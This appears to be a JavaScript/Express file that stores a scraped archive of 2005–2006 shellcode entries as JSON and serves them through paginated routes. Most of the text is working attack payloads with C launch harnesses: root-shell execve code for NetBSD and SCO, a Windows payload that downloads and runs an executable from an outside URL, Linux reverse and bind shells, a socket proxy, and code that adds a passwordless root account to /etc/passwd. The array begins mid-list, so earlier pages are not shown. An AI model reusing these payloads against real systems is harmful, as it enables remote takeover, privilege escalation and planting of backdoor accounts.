{"Title": "NetBSD/x86 - setreuid(0, 0) + execve(\"/bin//sh\", ..., NULL) Shellcode (29 bytes)", "Author": "p. minervini", "Published": ": 2005-11-30", "Platform": "NetBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-109.php", "View": null, "code": ["/*", " *  minervini at neuralnoise dot com (c) 2005", " *  NetBSD/i386 2.0, setreuid(0, 0); execve(\"/bin//sh\", ..., NULL);", " *  note: unsafe shellcode, but 29 bytes long;", " *  \t  doesn't work if (eax & 0x40000000) != 0;", " */", "", "#include <sys/types.h>", "#include <stdio.h>", "#include <string.h>", "", "char scode[] =", "  \"\\x99\"                   // cltd   ", "  \"\\x52\"                   // push   %edx", "  \"\\x52\"                   // push   %edx", "  \"\\x52\"                   // push   %edx", "  \"\\x6a\\x7e\"               // push   $0x7e", "  \"\\x58\"                   // pop    %eax", "  \"\\xcd\\x80\"               // int    $0x80", "  \"\\x68\\x2f\\x2f\\x73\\x68\"   // push   $0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\"   // push   $0x6e69622f", "  \"\\x89\\xe3\"               // mov    %esp,%ebx", "  \"\\x52\"                   // push   %edx", "  \"\\x54\"                   // push   %esp", "  \"\\x53\"                   // push   %ebx", "  \"\\x52\"                   // push   %edx", "  \"\\x34\\x3b\"               // xor    $0x3b,%al", "  \"\\xcd\\x80\";              // int    $0x80", "", "int main() {", "   void (*code) () = (void *) scode;", "   printf(\"length: %d\\n\", strlen(scode));", "   code();", "   return (0);", "}", "", "// milw0rm.com [2005-11-30]"]},
{"Title": "NetBSD/x86 - setreuid(0, 0) + execve(\"/bin//sh\", ..., NULL) Shellcode (30 bytes)", "Author": "p. minervini", "Published": ": 2005-11-30", "Platform": "NetBSD_x86", "Download": "https://old.exploit-db.com/download/13473.c", "View": "https://old.exploit-db.com/raw/13473/", "code": ["/*", " *  minervini at neuralnoise dot com (c) 2005", " *  NetBSD/i386 2.0, setreuid(0, 0); execve(\"/bin//sh\", ..., NULL);", " */", "", "#include <sys/types.h>", "#include <stdio.h>", "#include <string.h>", "", "char scode[] =", "  \"\\x31\\xc0\"             // xor    %eax,%eax", "  \"\\x50\"                 // push   %eax", "  \"\\x50\"                 // push   %eax", "  \"\\x50\"                 // push   %eax", "  \"\\x34\\x7e\"             // xor    $0x7e,%al", "  \"\\xcd\\x80\"             // int    $0x80", "  \"\\x58\"                 // pop    %eax", "  \"\\x68\\x2f\\x2f\\x73\\x68\" // push   $0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\" // push   $0x6e69622f", "  \"\\x89\\xe3\"             // mov    %esp,%ebx", "  \"\\x50\"                 // push   %eax", "  \"\\x54\"                 // push   %esp", "  \"\\x53\"                 // push   %ebx", "  \"\\x50\"                 // push   %eax", "  \"\\x34\\x3b\"             // xor    $0x3b,%al", "  \"\\xcd\\x80\";            // int    $0x80", "", "int main() {", "   void (*code) () = (void *) scode;", "   printf(\"length: %d\\n\", strlen(scode));", "   code();", "   return (0);", "}", "", "// milw0rm.com [2005-11-30]"]},
{"Title": "SCO/x86 - execve(\"/bin/sh\", ..., NULL) Shellcode (43 bytes)", "Author": "p. minervini", "Published": ": 2005-11-30", "Platform": "SCO_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-131.php", "View": null, "code": ["/*", " *  minervini at neuralnoise dot com (c) 2005", " *  SCO_SV scosysv 3.2 5.0.7 i386, execve(\"/bin/sh\", ..., NULL);", " */", "", "#include <sys/types.h>", "#include <stdio.h>", "", "char *scode = ", "  \"\\x31\\xc9\"             // xor    %ecx,%ecx", "  \"\\x89\\xe3\"             // mov    %esp,%ebx", "  \"\\x68\\xd0\\x8c\\x97\\xff\" // push   $0xff978cd0", "  \"\\x68\\xd0\\x9d\\x96\\x91\" // push   $0x91969dd0", "  \"\\x89\\xe2\"             // mov    %esp,%edx", "  \"\\x68\\xff\\xf8\\xff\\x6f\" // push   $0x6ffff8ff", "  \"\\x68\\x9a\\xff\\xff\\xff\" // push   $0xffffff9a", "  \"\\x80\\xf1\\x10\"         // xor    $0x10,%cl", "  \"\\xf6\\x13\"             // notb   (%ebx)", "  \"\\x4b\"                 // dec    %ebx", "  \"\\xe2\\xfb\"             // loop   $-3", "  \"\\x91\"                 // xchg   %eax,%ecx", "  \"\\x50\"                 // push   %eax", "  \"\\x54\"                 // push   %esp", "  \"\\x52\"                 // push   %edx", "  \"\\x50\"                 // push   %eax", "  \"\\x34\\x3b\"             // xor    $0x3b,%al", "  \"\\xff\\xe3\";            // jmp    *%ebx", "", "int main () {", "   void (*code) () = (void *) scode;", "   printf(\"length: %d\\n\", strlen(scode));", "   code();", "   return (0);", "}", "", "// milw0rm.com [2005-11-30]"]},
{"Title": "Windows/x86 - Download File (http://www.ph4nt0m.org/a.exe) + Execute (C:/a.exe) Shellcode (226+ bytes)", "Author": "darkeagle", "Published": ": 2005-12-23", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-162.php", "View": null, "code": ["/*", "\\    ______________________WIN_SHELLCODE__________________________", "/ :: win32 download & exec shellcode                              ::", "\\ :: by Darkeagle of Unl0ck Research Team [http://exploiterz.org] ::", "/ :: to avoid 0x00 use ^^xor^^ }:>                                ::", "\\ :: greets goes to: Sowhat, 0x557 guys, 55k7 guys, RST/GHC guys. ::", "/ ::_____________________________cya______________________________::", "\\", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char sh4llcode[] =", "\"\\xEB\\x54\\x8B\\x75\\x3C\\x8B\\x74\\x35\\x78\\x03\\xF5\\x56\\x8B\\x76\\x20\\x03\"", "\"\\xF5\\x33\\xC9\\x49\\x41\\xAD\\x33\\xDB\\x36\\x0F\\xBE\\x14\\x28\\x38\\xF2\\x74\"", "\"\\x08\\xC1\\xCB\\x0D\\x03\\xDA\\x40\\xEB\\xEF\\x3B\\xDF\\x75\\xE7\\x5E\\x8B\\x5E\"", "\"\\x24\\x03\\xDD\\x66\\x8B\\x0C\\x4B\\x8B\\x5E\\x1C\\x03\\xDD\\x8B\\x04\\x8B\\x03\"", "\"\\xC5\\xC3\\x75\\x72\\x6C\\x6D\\x6F\\x6E\\x2E\\x64\\x6C\\x6C\\x00\\x43\\x3A\\x5C\"", "\"\\x55\\x2e\\x65\\x78\\x65\\x00\\x33\\xC0\\x64\\x03\\x40\\x30\\x78\\x0C\\x8B\\x40\"", "\"\\x0C\\x8B\\x70\\x1C\\xAD\\x8B\\x40\\x08\\xEB\\x09\\x8B\\x40\\x34\\x8D\\x40\\x7C\"", "\"\\x8B\\x40\\x3C\\x95\\xBF\\x8E\\x4E\\x0E\\xEC\\xE8\\x84\\xFF\\xFF\\xFF\\x83\\xEC\"", "\"\\x04\\x83\\x2C\\x24\\x3C\\xFF\\xD0\\x95\\x50\\xBF\\x36\\x1A\\x2F\\x70\\xE8\\x6F\"", "\"\\xFF\\xFF\\xFF\\x8B\\x54\\x24\\xFC\\x8D\\x52\\xBA\\x33\\xDB\\x53\\x53\\x52\\xEB\"", "\"\\x24\\x53\\xFF\\xD0\\x5D\\xBF\\x98\\xFE\\x8A\\x0E\\xE8\\x53\\xFF\\xFF\\xFF\\x83\"", "\"\\xEC\\x04\\x83\\x2C\\x24\\x62\\xFF\\xD0\\xBF\\x7E\\xD8\\xE2\\x73\\xE8\\x40\\xFF\"", "\"\\xFF\\xFF\\x52\\xFF\\xD0\\xE8\\xD7\\xFF\\xFF\\xFF\"", "\"http://h0nest.org/1.exe\";", "", "int main()", "{", "", " void (*c0de)();", " printf(\"Win32 \\\"download & exec shellcode\\\"\\n\");", " *(int*)&c0de = sh4llcode;", " c0de();", "}", "", "// milw0rm.com [2005-12-23]"]},
{"Title": "Linux/x86 - Reverse (/TCP) Shell Shellcode (90 bytes) (Generator)", "Author": "xort", "Published": ": 2005-12-28", "Platform": "Generator", "Download": "http://shell-storm.org/shellcode/files/shellcode-242.php", "View": null, "code": ["/*---------------------------------------------------------------------------*", " *                 90 byte Connect Back shellcode                            *", " *              by Russell Sanford - xort@tty64.org                          *", " *---------------------------------------------------------------------------*", " *    filename: x86-linux-connect-back.c                                     *", " *        info: Compiled with DTP Project.                                   *", " * discription: This is a x86-linux connect back shellcode. Just invoke      *", " * \t\tthe function patchcode() before using shellcode. The format  *", " * \t\tfor invoking patchcode is as follows:                        *", " *                                                                           *", " * \t\tpatchcode(shellcode,\"11.22.33.44\",31337);                    *", " *---------------------------------------------------------------------------*/", "", "char shellcode[] =", "\"\\x31\\xc0\\x6a\\x01\\x5b\\x50\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x43\\x5f\\x68\"", "\" xor\\x81\\x04\\x24t@tt\\x68y64.\\x81\\x04\\x24org \\x6a\\x10\\x51\\x50\\x89\\xe1\\xb0\\x66\"", "\"\\xcd\\x80\\x5b\\x31\\xc9\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf5\\x31\\xc0\\x50\"", "\"\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\"", "\"\\xcd\\x80\\xeb\\xfe\";", "", "int find_safe_offset(int INT_A) {", "", "\tint INT_B=0;", "\t", "\tdo {", "\t\tINT_A -= 0x01010101;\tINT_B += 0x01010101;", "\t}", "\twhile ( ((INT_A & 0x000000ff) == 0) || ", "\t\t((INT_A & 0x0000ff00) == 0) || ", "\t\t((INT_A & 0x00ff0000) == 0) ||", "\t\t((INT_A & 0xff000000) == 0) );", "", "\treturn INT_B;", "}", "", "void patchcode(char *shellcode, char *IP, int PORT) {", "\t", "\tint IP_A = inet_addr(IP);", "\tint IP_B = find_safe_offset(IP_A);", "", "\tint PORT_A = ((ntohs(PORT) << 16) + 2);", "\tint PORT_B = find_safe_offset(PORT_A);\t", "", "\t*(int *)&shellcode[19] = (IP_A - IP_B);", "\t*(int *)&shellcode[26] = IP_B;", "", "\t*(int *)&shellcode[31] = (PORT_A - PORT_B);", "\t*(int *)&shellcode[38] = PORT_B;", "}", "", "// milw0rm.com [2005-12-28]"]},
{"Title": "Linux/x86 - Socket-Proxy (31337:11.22.33.44:80) Shellcode (372 bytes)", "Author": "xort", "Published": ": 2005-12-28", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13402.c", "View": "https://old.exploit-db.com/raw/13402/", "code": ["/*---------------------------------------------------------------------------*", " *                372 byte socket-proxy shellcode                            *", " *              by Russell Sanford - xort@tty64.org                          *", " *---------------------------------------------------------------------------*", " *    filename: x86-linux-bounce-proxy.c                                     *", " *        date: 12/23/2005                                                   *", " *        info: Compiled with DTP Project.                                   *", " * discription: This is a x86-linux proxy shellcode. This is probably best   *", " * \t        used in stage 2 situations. The syntax for invoking the      *", " * \t        patchcode is as follows:                                     *", " *                                                                           *", " * \t\tpatchcode(shellcode,31337,\"11.22.33.44\",80);                 *", " *                                                                           *", " * \t\tWhere 31337 is the port to listen to on the remote host      *", " *---------------------------------------------------------------------------*/", "", "char shellcode[] =", "\"\\xe8\\xff\\xff\\xff\\xff\\xc6\\x4e\\x5e\\x81\\xc6\\x18\\xfc\\xff\\xff\\xeb\\x48\\x89\\xc3\\x6a\\x03\\x59\\xb0\\xdd\\xcd\"", "\"\\x80\\x56\\x89\\xde\\x80\\xcc\\x08\\x6a\\x04\\x59\\xb0\\xdd\\xcd\\x80\\x93\\x5e\\xc3\\x89\\xc2\\x83\\xe0\\x1f\\xc1\\xea\"", "\"\\x05\\x8d\\x8e\\x78\\xff\\xff\\xff\\x0f\\xab\\x04\\x91\\xc3\\x93\\xb0\\x03\\x8d\\x8e\\x48\\xf4\\xff\\xff\\x66\\xba\\x01\"", "\"\\x08\\xcd\\x80\\xc3\\x93\\xb0\\x04\\x8d\\x8e\\x48\\xf4\\xff\\xff\\xcd\\x80\\xc3\\x8d\\xbe\\xf8\\xfe\\xff\\xff\\x31\\xc0\"", "\"\\x31\\xc9\\x66\\xb9\\x01\\x01\\xf3\\xaa\\x31\\xc0\\x6a\\x01\\x5b\\x50\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\"", "\"\\x5a\\x68\\x7e\\xff\\xfe\\xff\\x81\\x04\\x24\\x01\\x01\\x01\\x01\\x68 xor\\x81\\x04\\x24t@tt\\x6a\\x10\\x51\\x50\\x89\"", "\"\\xe1\\xb0\\x66\\xcd\\x80\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x5a\\x50\\x50\\x52\\x89\\xe1\\xfe\\xc3\\xb0\\x66\\xcd\\x80\\x89\"", "\"\\x46\\xfc\\xe8\\x5b\\xff\\xff\\xff\\xe8\\x6f\\xff\\xff\\xff\\x31\\xc0\\x6a\\x01\\x5b\\x50\\x53\\x6a\\x02\\x89\\xe1\\xb0\"", "\"\\x66\\xcd\\x80\\x5b\\x43\\x5f\\x68y64.\\x81\\x04\\x24org \\x68need\\x81\\x04\\x24 job\\x6a\\x10\\x51\\x50\\x89\\xe1\"", "\"\\xb0\\x66\\xcd\\x80\\x58\\x89\\x46\\xf8\\xe8\\x19\\xff\\xff\\xff\\xe8\\x2d\\xff\\xff\\xff\\x8b\\x5e\\xfc\\x8b\\x4e\\xf8\"", "\"\\x6a\\x01\\x53\\x51\\x6a\\x02\\x51\\x53\\x39\\xd9\\x7e\\x02\\x89\\xcb\\x56\\x43\\x8d\\x8e\\x78\\xff\\xff\\xff\\x31\\xd2\"", "\"\\x31\\xf6\\x31\\xff\\xb0\\x8e\\xcd\\x80\\x5e\\x58\\x50\\x89\\xc2\\x83\\xe0\\x1f\\xc1\\xea\\x05\\x8d\\x8e\\x78\\xff\\xff\"", "\"\\xff\\x0f\\xa3\\x04\\x91\\x73\\x04\\x59\\x59\\xeb\\x32\\x58\\x50\\xe8\\xe5\\xfe\\xff\\xff\\x58\\x31\\xff\\x47\\x83\\x7c\"", "\"\\x24\\x04\\x02\\x74\\x02\\xf7\\xdf\\x01\\xf8\\xe8\\xe4\\xfe\\xff\\xff\\x39\\xc0\\x89\\xc2\\x58\\x31\\xff\\x47\\x83\\x3c\"", "\"\\x24\\x02\\x75\\x02\\xf7\\xdf\\x01\\xf8\\xe8\\xdd\\xfe\\xff\\xff\\x59\\xe2\\xb1\\xeb\\x88\";", "", "int find_safe_offset(int INT_A) {", "", "\tint INT_B=0;", "\t", "\tdo {", "\t\tINT_A -= 0x01010101;\tINT_B += 0x01010101;", "\t}", "\twhile ( ((INT_A & 0x000000ff) == 0) || ", "\t\t((INT_A & 0x0000ff00) == 0) || ", "\t\t((INT_A & 0x00ff0000) == 0) ||", "\t\t((INT_A & 0xff000000) == 0) );", "", "\treturn INT_B;", "}", "", "void patchcode(char *shellcode, int PORT_IN, char *IP, int PORT_OUT) {", "\t", "\tint PORT_IN_A = ((ntohs(PORT_IN) << 16) + 2);", "\tint PORT_IN_B = find_safe_offset(PORT_IN_A);\t", "", "\tint IP_A = inet_addr(IP);", "\tint IP_B = find_safe_offset(IP_A);", "", "\tint PORT_OUT_A = ((ntohs(PORT_OUT) << 16) + 2);", "\tint PORT_OUT_B = find_safe_offset(PORT_OUT_A);\t", "", "\t*(int *)&shellcode[134] = (PORT_IN_A - PORT_IN_B);", "\t*(int *)&shellcode[141] = PORT_IN_B;", "", "\t*(int *)&shellcode[205] = (IP_A - IP_B);", "\t*(int *)&shellcode[212] = IP_B;", "\t", "\t*(int *)&shellcode[217] = (PORT_OUT_A - PORT_OUT_B);", "\t*(int *)&shellcode[224] = PORT_OUT_B;", "", "}", "", "// milw0rm.com [2005-12-28]"]},
{"Title": "Linux/x86 - Add Root User (xtz) To /etc/passwd + No Password Shellcode (59 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13385.c", "View": "https://old.exploit-db.com/raw/13385/", "code": ["/*", " * (linux/x86) adds user 'xtz' without password to /etc/passwd - 59 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x05\"              // push $0x5 ", "", "\t//", "\t// <_exit>:", "\t//", "", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x31\\xc9\"              // xor %ecx,%ecx ", "\t\"\\x66\\xb9\\x01\\x04\"      // mov $0x401,%cx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x73\\x73\\x77\\x64\"  // push $0x64777373 ", "\t\"\\x68\\x63\\x2f\\x70\\x61\"  // push $0x61702f63 ", "\t\"\\x68\\x2f\\x2f\\x65\\x74\"  // push $0x74652f2f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x68\\x3a\\x3a\\x3a\\x0a\"  // push $0xa3a3a3a ", "\t\"\\x68\\x3a\\x30\\x3a\\x30\"  // push $0x303a303a ", "\t\"\\x68\\x78\\x74\\x7a\\x3a\"  // push $0x3a7a7478 ", "\t\"\\x89\\xc3\"              // mov %eax,%ebx ", "\t\"\\xb0\\x04\"              // mov $0x4,%al ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xb2\\x0c\"              // mov $0xc,%dl ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x6a\\x01\"              // push $0x1 ", "\t\"\\xeb\\xc7\";             // jmp <_exit>", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Anti-Debug Trick (INT 3h trap) Shellcode (39 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-230.php", "View": null, "code": ["/*", " * (linux/x86) anti-debug trick (INT 3h trap) + execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL) - 39 bytes ", " * ", " * The idea behind a shellcode w/ an anti-debugging trick embedded in it, is if for any reason the IDS ", " * would try to x86-emulate the shellcode it would *glitch* and fail. This also protectes the shellcode ", " * from running within a debugger environment such as gdb and strace. ", " *", " * How this works? the shellcode registers for the SIGTRAP signal (aka. Breakpoint Interrupt) and use it ", " * to call the acutal payload (e.g. _evil_code) while a greedy debugger or a confused x86-emu won't pass ", " * the signal handler to the shellcode, it would end up doing _exit() instead execuve() ", " *", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x30\"              // push $0x30 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x6a\\x05\"              // push $0x5 ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\xeb\\x05\"              // jmp <_evil_code> ", "", "\t//", " \t// <_evilcode_loc>:", "\t//", "", "\t\"\\x59\"                  // pop %ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\xcc\"                  // int3 ", "\t\"\\x40\"                  // inc %eax ", "\t\"\\xe8\\xf6\\xff\\xff\\xff\"  // call <_evilcode_loc> ", "\t\"\\x99\"                  // cltd ", "", "\t// ", "        // <_evil_code>: ", "        //", "", "\t\"\\xb0\\x0b\"              // mov $0xb,%al ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x54\"                  // push %esp ", "\t\"\\xeb\\xe1\";             // jmp <_evilcode_loc> ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - Bind (31337/TCP) Shell (/bin/sh) Shellcode (80 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13387.c", "View": "https://old.exploit-db.com/raw/13387/", "code": ["/*", " * (linux/x86) bind '/bin/sh' to 31337/tcp - 80 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x66\"              // push $0x66 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x6a\\x01\"              // push $0x1 ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x6a\\x02\"              // push $0x2 ", "", "\t//", "\t// <_doint>:", "\t//", "", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x5d\"                  // pop %ebp ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x66\\xbd\\x69\\x7a\"      // mov $0x7a69,%bp (0x7a69 = 31337) ", "\t\"\\x0f\\xcd\"              // bswap %ebp ", "\t\"\\x09\\xdd\"              // or %ebx,%ebp ", "\t\"\\x55\"                  // push %ebp ", "\t\"\\x6a\\x10\"              // push $0x10 ", "\t\"\\x51\"                  // push %ecx ", "\t\"\\x50\"                  // push %eax ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xb0\\x66\"              // mov $0x66,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\xb3\\x04\"              // mov $0x4,%bl ", "\t\"\\xb0\\x66\"              // mov $0x66,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x89\\x64\\x24\\x08\"      // mov %esp,0x8(%esp) ", "\t\"\\x43\"                  // inc %ebx ", "\t\"\\xb0\\x66\"              // mov $0x66,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x93\"                  // xchg %eax,%ebx ", "\t\"\\x59\"                  // pop %ecx ", "", "\t//", "\t// <_dup2loop>:", "\t//", "", "\t\"\\xb0\\x3f\"              // mov $0x3f,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x49\"                  // dec %ecx ", "\t\"\\x79\\xf9\"              // jns <_dup2loop> ", "", "\t\"\\xb0\\x0b\"              // mov $0xb,%al ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\xeb\\xbb\";             // jmp <_doint> ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - Bind (31337/TCP) Shell (/bin/sh) + fork() Shellcode (98 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13388.c", "View": "https://old.exploit-db.com/raw/13388/", "code": ["/*", " * (linux/x86) bind '/bin/sh' to 31337/tcp + fork() - 98 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x66\"              // push $0x66 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x6a\\x01\"              // push $0x1 ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x6a\\x02\"              // push $0x2 ", "", "\t//", "\t// <_doint>:", "\t//", "", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x5d\"                  // pop %ebp ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x66\\xbd\\x69\\x7a\"      // mov $0x7a69,%bp (0x7a69 = 31337)", "\t\"\\x0f\\xcd\"              // bswap %ebp ", "\t\"\\x09\\xdd\"              // or %ebx,%ebp ", "\t\"\\x55\"                  // push %ebp ", "\t\"\\x6a\\x10\"              // push $0x10 ", "\t\"\\x51\"                  // push %ecx ", "\t\"\\x50\"                  // push %eax ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xb0\\x66\"              // mov $0x66,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\xb3\\x04\"              // mov $0x4,%bl ", "\t\"\\xb0\\x66\"              // mov $0x66,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "", "\t//", "\t// <_acceptloop>:", "\t//", "", "\t\"\\x5f\"                  // pop %edi ", "\t\"\\x50\"                  // push %eax ", "\t\"\\x50\"                  // push %eax ", "\t\"\\x57\"                  // push %edi ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\x43\"                  // inc %ebx ", "\t\"\\xb0\\x66\"              // mov $0x66,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x93\"                  // xchg %eax,%ebx ", "\t\"\\xb0\\x02\"              // mov $0x2,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x85\\xc0\"              // test %eax,%eax ", "\t\"\\x75\\x1a\"              // jne <_parent> ", "\t\"\\x59\"                  // pop %ecx ", "", "\t//", "\t// <_dup2loop>:", "\t//", "", "\t\"\\xb0\\x3f\"              // mov $0x3f,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x49\"                  // dec %ecx ", "\t\"\\x79\\xf9\"              // jns <_dup2loop> ", "", "\t\"\\xb0\\x0b\"              // mov $0xb,%al ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\xeb\\xb2\"              // jmp <_doint> ", "", "\t//", "\t// <_parent>:", "\t//", "", "\t\"\\x6a\\x06\"              // push $0x6 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\xb3\\x04\"              // mov $0x4,%bl ", "\t\"\\xeb\\xc9\";             // jmp <_acceptloop> ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]}
]
 
app.get('/pagina1', (req, res) => {
	return res.json(pag_1);
});
app.get('/pagina2', (req, res) => {
	return res.json(pag_2);
});
app.get('/pagina3', (req, res) => {
	return res.json(pag_3);
});
app.get('/pagina4', (req, res) => {
	return res.json(pag_4);
});
app.get('/pagina5', (req, res) => {
	return res.json(pag_5);
});
app.get('/pagina6', (req, res) => {
	return res.json(pag_6);
});
app.get('/pagina7', (req, res) => {
	return res.json(pag_7);
});
app.get('/pagina8', (req, res) => {
	return res.json(pag_8);
});
app.get('/pagina9', (req, res) => {
	return res.json(pag_9);
});
app.get('/pagina10', (req, res) => {
	return res.json(pag_10);
});
app.get('/pagina11', (req, res) => {
	return res.json(pag_11);
});
app.get('/pagina12', (req, res) => {
	return res.json(pag_12);
});

app.listen(9000, () => console.log('Express started at http://localhost:9000'));
